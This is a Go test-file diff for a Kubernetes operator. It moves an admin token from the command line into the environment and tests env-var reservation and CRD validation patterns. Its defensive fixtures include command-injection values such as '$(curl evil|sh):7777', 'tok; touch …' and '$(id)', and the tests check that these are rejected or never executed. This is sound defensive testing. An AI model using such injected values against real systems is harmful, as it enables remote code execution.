@@ -13,13 +13,16 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"slices"
 	"strconv"
 	"strings"
 	"testing"
 
+	"github.com/go-logr/logr/funcr"
 	appsv1 "k8s.io/api/apps/v1"
 	corev1 "k8s.io/api/core/v1"
+	apiextensionsv1 "k8s.io/apiextensions-apiserver/pkg/apis/apiextensions/v1"
 	apierrors "k8s.io/apimachinery/pkg/api/errors"
 	"k8s.io/apimachinery/pkg/api/meta"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
@@ -28,6 +31,7 @@ import (
 	"sigs.k8s.io/controller-runtime/pkg/client"
 	"sigs.k8s.io/controller-runtime/pkg/client/fake"
 	"sigs.k8s.io/controller-runtime/pkg/envtest"
+	"sigs.k8s.io/yaml"
 
 	oramav1alpha1 "github.com/oramasearch/orama-operator/api/v1alpha1"
 )
@@ -92,11 +96,12 @@ func TestValidateZettaPeerAddress(t *testing.T) {
 }
 
 // fakeZettaDir writes a `zetta` stub that records its argv (length-prefixed, so newlines survive) to
-// $FAKE_ZETTA_OUT, and returns the directory to put first on PATH.
+// $FAKE_ZETTA_OUT and the ZETTA_ADMIN_TOKEN it sees in its environment to $FAKE_ZETTA_OUT.env, and returns the directory to put first on PATH.
 func fakeZettaDir(t *testing.T) string {
 	t.Helper()
 	dir := t.TempDir()
-	stub := "#!/bin/sh\n{ printf '%s\\n' \"$#\"; for a in \"$@\"; do printf '%s:%s\\n' \"${#a}\" \"$a\"; done; } > \"$FAKE_ZETTA_OUT\"\n"
+	stub := "#!/bin/sh\n{ printf '%s\\n' \"$#\"; for a in \"$@\"; do printf '%s:%s\\n' \"${#a}\" \"$a\"; done; } > \"$FAKE_ZETTA_OUT\"\n" +
+		"printf '%s' \"${ZETTA_ADMIN_TOKEN-<unset>}\" > \"$FAKE_ZETTA_OUT.env\"\n"
 	if err := os.WriteFile(filepath.Join(dir, "zetta"), []byte(stub), 0o755); err != nil {
 		t.Fatal(err)
 	}
@@ -155,19 +160,28 @@ func testShells() []string {
 // refs, and returns zetta's argv.
 func runZettaContainer(t *testing.T, c corev1.Container, refs map[string]string) []string {
 	t.Helper()
-	var first []string
-	for i, shell := range testShells() {
-		got := runZettaContainerWith(t, shell, c, refs)
-		if i == 0 {
-			first = got
-		} else if !slices.Equal(got, first) {
-			t.Fatalf("%s and /bin/sh disagree\n%s: %q\n/bin/sh: %q", shell, shell, got, first)
-		}
-	}
-	return first
+	argv, _ := runZettaNode(t, c, refs)
+	return argv
 }
 
-func runZettaContainerWith(t *testing.T, shell string, c corev1.Container, refs map[string]string) []string {
+// runZettaNode is runZettaContainer that also returns the ZETTA_ADMIN_TOKEN zetta saw in its environment
+// ("<unset>" when absent).
+func runZettaNode(t *testing.T, c corev1.Container, refs map[string]string) ([]string, string) {
+	t.Helper()
+	var first []string
+	var firstToken string
+	for i, shell := range testShells() {
+		got, token := runZettaContainerWith(t, shell, c, refs)
+		if i == 0 {
+			first, firstToken = got, token
+		} else if !slices.Equal(got, first) || token != firstToken {
+			t.Fatalf("%s and /bin/sh disagree\n%s: %q %q\n/bin/sh: %q %q", shell, shell, got, token, first, firstToken)
+		}
+	}
+	return first, firstToken
+}
+
+func runZettaContainerWith(t *testing.T, shell string, c corev1.Container, refs map[string]string) ([]string, string) {
 	t.Helper()
 	dir := fakeZettaDir(t)
 	out := filepath.Join(t.TempDir(), "argv")
@@ -192,7 +206,24 @@ func runZettaContainerWith(t *testing.T, shell string, c corev1.Container, refs 
 	if output, err := cmd.CombinedOutput(); err != nil {
 		t.Fatalf("entrypoint failed: %v\n%s", err, output)
 	}
-	return readFakeZettaArgv(t, out)
+	token, err := os.ReadFile(out + ".env")
+	if err != nil {
+		t.Fatal(err)
+	}
+	return readFakeZettaArgv(t, out), string(token)
+}
+
+// withoutFlag removes every `flag <value>` pair from argv.
+func withoutFlag(argv []string, flag string) []string {
+	var out []string
+	for i := 0; i < len(argv); i++ {
+		if argv[i] == flag && i+1 < len(argv) {
+			i++
+			continue
+		}
+		out = append(out, argv[i])
+	}
+	return out
 }
 
 // legacyZettaEntrypoint is the entrypoint text the operator rendered before operator#279, copied with its comments removed
@@ -281,24 +312,29 @@ func devZettaClusters() []*oramav1alpha1.OramaZettaCluster {
 	}
 }
 
-// TestZettaDevClustersGoldenArgv pins the argv the dev clusters' nodes start with. It is the argv their
-// running pods were started with by the previous entrypoint (no peers, dial-out-only, permanent).
+// TestZettaDevClustersGoldenArgv pins the argv the dev clusters' nodes start with: the argv their running
+// pods were started with by the previous entrypoint (no peers, dial-out-only, permanent) minus
+// `--admin-token <token>`, which now reaches zetta only through its environment (operator#279).
 func TestZettaDevClustersGoldenArgv(t *testing.T) {
 	want := []string{
 		"--headless", "--data-dir", "/data", "--listen", "0.0.0.0:7777", "--mcp-listen", "0.0.0.0:4800",
-		"--node-type", "permanent", "--dial-out-only", "--admin-token", testAdminToken,
+		"--node-type", "permanent", "--dial-out-only",
 	}
 	for _, z := range devZettaClusters() {
-		got := runZettaContainer(t, renderZettaContainer(t, z, "", nil), zettaRefs(z, 0))
+		got, token := runZettaNode(t, renderZettaContainer(t, z, "", nil), zettaRefs(z, 0))
 		if !slices.Equal(got, want) {
 			t.Errorf("%s/%s argv\n got %q\nwant %q", z.Namespace, z.Name, got, want)
+		}
+		if token != testAdminToken {
+			t.Errorf("%s/%s: zetta's ZETTA_ADMIN_TOKEN = %q, want the seeded token", z.Namespace, z.Name, token)
 		}
 	}
 }
 
 // TestZettaEntrypointMatchesLegacyArgv runs the old string-built entrypoint and the new one side by side for
 // every valid shape (dev specs, multi-node, wan, hostNetwork, ephemeral, explicit + derived peers, IPv6) and
-// every ordinal, and requires the exact same zetta argv.
+// every ordinal, and requires the exact same zetta argv except `--admin-token <token>`, which the old
+// entrypoint passed as a flag and the new one leaves in the environment, where zetta must still see it.
 func TestZettaEntrypointMatchesLegacyArgv(t *testing.T) {
 	type tc struct {
 		name      string
@@ -349,8 +385,18 @@ func TestZettaEntrypointMatchesLegacyArgv(t *testing.T) {
 				replicas = 1
 			}
 			for ord := 0; ord < replicas; ord++ {
-				got := runZettaContainer(t, current, zettaRefs(c.z, ord))
-				want := runZettaContainer(t, legacy, zettaRefs(c.z, ord))
+				got, token := runZettaNode(t, current, zettaRefs(c.z, ord))
+				legacyArgv := runZettaContainer(t, legacy, zettaRefs(c.z, ord))
+				if !slices.Contains(legacyArgv, "--admin-token") {
+					t.Fatalf("ordinal %d: the previous entrypoint should have passed --admin-token", ord)
+				}
+				want := withoutFlag(legacyArgv, "--admin-token")
+				if slices.Contains(got, "--admin-token") || slices.Contains(got, testAdminToken) {
+					t.Errorf("ordinal %d: the admin token is on the command line: %q", ord, got)
+				}
+				if token != testAdminToken {
+					t.Errorf("ordinal %d: zetta's ZETTA_ADMIN_TOKEN = %q, want the seeded token", ord, token)
+				}
 				if !slices.Equal(got, want) {
 					t.Errorf("ordinal %d argv differs from the previous entrypoint\n got %q\nwant %q", ord, got, want)
 				}
@@ -394,7 +440,7 @@ func TestZettaEntrypointNeverShellParsesValues(t *testing.T) {
 			{Name: "ZETTA_ADMIN_TOKEN", Value: "tok; touch " + marker},
 		},
 	}
-	got := runZettaContainer(t, c, nil)
+	got, token := runZettaNode(t, c, nil)
 	if _, err := os.Stat(marker); err == nil {
 		t.Fatal("a hostile value was executed by the entrypoint shell")
 	}
@@ -403,9 +449,12 @@ func TestZettaEntrypointNeverShellParsesValues(t *testing.T) {
 	for _, p := range peers {
 		want = append(want, "--peer", p)
 	}
-	want = append(want, "--advertise", "$(touch "+marker+") *", "--admin-token", "tok; touch "+marker)
+	want = append(want, "--advertise", "$(touch "+marker+") *")
 	if !slices.Equal(got, want) {
 		t.Errorf("hostile values were split, globbed or rewritten\n got %q\nwant %q", got, want)
+	}
+	if token != "tok; touch "+marker {
+		t.Errorf("admin token in zetta's environment = %q, want it unchanged", token)
 	}
 
 	// Control: the pre-#279 entrypoint runs a peer's command substitution.
@@ -583,5 +632,171 @@ func TestZettaCRDRefusesInvalidPeers(t *testing.T) {
 	good := mk("good", []string{"1.2.3.4:7777", "zetta.example.com:65535", "[fd00::1]:7777"}, "fd00::2")
 	if err := kubeClient.Create(ctx, good); err != nil {
 		t.Errorf("valid peers refused: %v", err)
+	}
+}
+
+// TestZettaCustomEnvReservesEngineProvisioningNames: spec.env may not set the engine's own provisioning env,
+// which would add an unvalidated peer (ZETTA_SEED_PEER) or move the data dir off the PVC (ZETTA_DATA_DIR).
+func TestZettaCustomEnvReservesEngineProvisioningNames(t *testing.T) {
+	z := newZettaTestCluster()
+	z.Spec.Env = []corev1.EnvVar{
+		{Name: "ZETTA_SEED_PEER", Value: "$(curl evil|sh):7777"},
+		{Name: "ZETTA_DATA_DIR", Value: "/tmp"},
+		{Name: zettaSeedEnv, Value: "evil:7777"},
+		{Name: "MALLOC_ARENA_MAX", Value: "2"},
+	}
+	c := renderZettaContainer(t, z, "", nil)
+	for _, name := range []string{"ZETTA_SEED_PEER", "ZETTA_DATA_DIR"} {
+		if findEnv(c.Env, name) != nil {
+			t.Errorf("spec.env set the reserved %s", name)
+		}
+	}
+	if seed := findEnv(c.Env, zettaSeedEnv); seed == nil || seed.Value != "z0-zetta-0.z0-zetta-headless.orama-system.svc.cluster.local:7777" {
+		t.Errorf("%s = %+v, want the operator's seed", zettaSeedEnv, seed)
+	}
+	if findEnv(c.Env, "MALLOC_ARENA_MAX") == nil {
+		t.Error("an ordinary spec.env entry was dropped")
+	}
+	_, ignored := zettaCustomEnv(z.Spec.Env)
+	if want := []string{zettaSeedEnv, "ZETTA_DATA_DIR", "ZETTA_SEED_PEER"}; !slices.Equal(ignored, want) {
+		t.Errorf("ignored = %q, want %q", ignored, want)
+	}
+}
+
+// TestPeerAddressesConditionForClearsStaleSpecRefusal: once the spec is valid again, a stale
+// InvalidSpecPeerAddress is cleared even on a round where the topology could not be read; any other condition
+// is kept on such a round (no flapping), and a full round always decides.
+func TestPeerAddressesConditionForClearsStaleSpecRefusal(t *testing.T) {
+	withCond := func(reason string) *oramav1alpha1.OramaZettaCluster {
+		z := newZettaTestCluster()
+		meta.SetStatusCondition(&z.Status.Conditions, metav1.Condition{
+			Type: peerAddressesConditionType, Status: metav1.ConditionFalse, Reason: reason, Message: "old"})
+		return z
+	}
+	if c := peerAddressesConditionFor(withCond("InvalidSpecPeerAddress"), nil, nil, false); c == nil || c.Status != metav1.ConditionTrue {
+		t.Errorf("stale spec refusal with a failed topology read: %+v, want True", c)
+	}
+	if c := peerAddressesConditionFor(withCond("InvalidTopologyPeerDropped"), nil, nil, false); c != nil {
+		t.Errorf("failed topology read must leave a topology condition alone, got %+v", c)
+	}
+	if c := peerAddressesConditionFor(newZettaTestCluster(), nil, nil, false); c != nil {
+		t.Errorf("failed topology read with no condition: %+v, want nil", c)
+	}
+	if c := peerAddressesConditionFor(withCond("InvalidTopologyPeerDropped"), []string{"x"}, nil, false); c == nil || c.Reason != "InvalidSpecPeerAddress" {
+		t.Errorf("an invalid spec is reported whatever the topology read: %+v", c)
+	}
+	if c := peerAddressesConditionFor(withCond("InvalidTopologyPeerDropped"), nil, nil, true); c == nil || c.Status != metav1.ConditionTrue {
+		t.Errorf("a full round with nothing dropped: %+v, want True", c)
+	}
+}
+
+// TestInvalidSpecPeerMessageQuotesValues: the spec-invalid message carries hostile values only Go-quoted —
+// no raw newline, and no unquoted copy inside the validation reason.
+func TestInvalidSpecPeerMessageQuotesValues(t *testing.T) {
+	z := newZettaTestCluster()
+	z.Spec.ExternalPeers = []string{"10.0.0.1:7777\ninjected: line", "evil host:7777"}
+	z.Spec.WanAddress = "9.9.9.9\nx"
+	cond := peerAddressesCondition(invalidSpecPeerAddresses(z), nil)
+	if strings.Contains(cond.Message, "\n") {
+		t.Fatalf("message carries a raw newline: %q", cond.Message)
+	}
+	for _, want := range []string{`"10.0.0.1:7777\ninjected: line"`, `"evil host:7777"`, `"9.9.9.9\nx"`} {
+		if !strings.Contains(cond.Message, want) {
+			t.Errorf("message %q lacks the quoted value %s", cond.Message, want)
+		}
+	}
+	if strings.Count(cond.Message, "evil host") != 1 {
+		t.Errorf("a value appears outside its quoted form: %q", cond.Message)
+	}
+}
+
+// TestDeriveValidExternalPeersTrimsAddresses: surrounding whitespace on a topology address is trimmed before
+// validation (the old renderer trimmed too), so a padded but valid row is kept.
+func TestDeriveValidExternalPeersTrimsAddresses(t *testing.T) {
+	rows := []topoRow{{operator: "op-B", cluster: "c", node: "n", address: " 5.6.7.8:7777\t",
+		reachability: oramav1alpha1.ReachabilityWANAccessible, status: topoStatusActive, updatedAt: "2026-10-09T00:00:00Z"}}
+	valid, dropped := deriveValidExternalPeers(rows, "op-A", "c", nil)
+	if !slices.Equal(valid, []string{"5.6.7.8:7777"}) || len(dropped) != 0 {
+		t.Errorf("valid = %q, dropped = %q", valid, dropped)
+	}
+}
+
+// TestNoteDroppedTopologyPeersLogsOncePerChange: a steady set of hostile rows is logged once, a change is
+// logged again, and an empty set logs nothing.
+func TestNoteDroppedTopologyPeersLogsOncePerChange(t *testing.T) {
+	var lines []string
+	log := funcr.New(func(prefix, args string) { lines = append(lines, args) }, funcr.Options{})
+	r := &OramaZettaClusterReconciler{}
+	r.noteDroppedTopologyPeers(log, "ns/z", "c", []string{"a b", "$(x)"})
+	r.noteDroppedTopologyPeers(log, "ns/z", "c", []string{"$(x)", "a b"})
+	if len(lines) != 1 {
+		t.Fatalf("logged %d times for an unchanged set, want 1", len(lines))
+	}
+	r.noteDroppedTopologyPeers(log, "ns/z", "c", []string{"$(y)"})
+	if len(lines) != 2 {
+		t.Fatalf("a changed set was not logged")
+	}
+	r.noteDroppedTopologyPeers(log, "ns/z", "c", nil)
+	r.noteDroppedTopologyPeers(log, "ns/z", "c", nil)
+	if len(lines) != 2 {
+		t.Fatalf("an empty set was logged")
+	}
+}
+
+// crdStringRule reads a string property's pattern and maxLength from the generated OramaZettaCluster CRD.
+func crdStringRule(t *testing.T, path ...string) (*regexp.Regexp, int64) {
+	t.Helper()
+	raw, err := os.ReadFile("../../config/crd/bases/orama.cloud_oramazettaclusters.yaml")
+	if err != nil {
+		t.Fatal(err)
+	}
+	var crd apiextensionsv1.CustomResourceDefinition
+	if err := yaml.Unmarshal(raw, &crd); err != nil {
+		t.Fatal(err)
+	}
+	schema := crd.Spec.Versions[0].Schema.OpenAPIV3Schema.Properties["spec"]
+	for _, p := range path {
+		if p == "[]" {
+			schema = *schema.Items.Schema
+		} else {
+			schema = schema.Properties[p]
+		}
+	}
+	if schema.Pattern == "" || schema.MaxLength == nil {
+		t.Fatalf("spec.%v has no pattern/maxLength in the generated CRD", path)
+	}
+	return regexp.MustCompile(schema.Pattern), *schema.MaxLength
+}
+
+// TestZettaCRDPatternsFromGeneratedYAML checks the generated CRD's patterns without an API server (the
+// envtest twin, TestZettaCRDRefusesInvalidPeers, skips without KUBEBUILDER_ASSETS). The API server matches
+// CRD patterns with Go's regexp, so compiling them here is the same check.
+func TestZettaCRDPatternsFromGeneratedYAML(t *testing.T) {
+	peer, peerMax := crdStringRule(t, "externalPeers", "[]")
+	wan, wanMax := crdStringRule(t, "wanAddress")
+	accepts := func(re *regexp.Regexp, max int64, v string) bool { return int64(len(v)) <= max && re.MatchString(v) }
+	for _, ok := range []string{"1.2.3.4:7777", "zetta.example.com:65535", "[fd00::1]:7777", "a:1"} {
+		if !accepts(peer, peerMax, ok) {
+			t.Errorf("externalPeers pattern refuses valid %q", ok)
+		}
+		if validateZettaPeerAddress(ok) != nil {
+			t.Errorf("controller refuses %q that the CRD accepts", ok)
+		}
+	}
+	for _, bad := range append(maliciousPeers("/tmp/m"), " 1.2.3.4:7777", "1.2.3.4:7777 ", "1.2.3.4:07777",
+		strings.Repeat("a.", 130)+"b:7777") {
+		if accepts(peer, peerMax, bad) {
+			t.Errorf("externalPeers pattern accepts %q", bad)
+		}
+	}
+	for _, ok := range []string{"9.9.9.9", "9.9.9.9:7777", "zetta.example.com", "fd00::2", "[fd00::1]", "[fd00::1]:7777"} {
+		if !accepts(wan, wanMax, ok) {
+			t.Errorf("wanAddress pattern refuses valid %q", ok)
+		}
+	}
+	for _, bad := range []string{"9.9.9.9; id", "$(id)", "a,b", "9.9.9.9:70000", "9.9.9.9 --x", "a\nb"} {
+		if accepts(wan, wanMax, bad) {
+			t.Errorf("wanAddress pattern accepts %q", bad)
+		}
 	}
 }
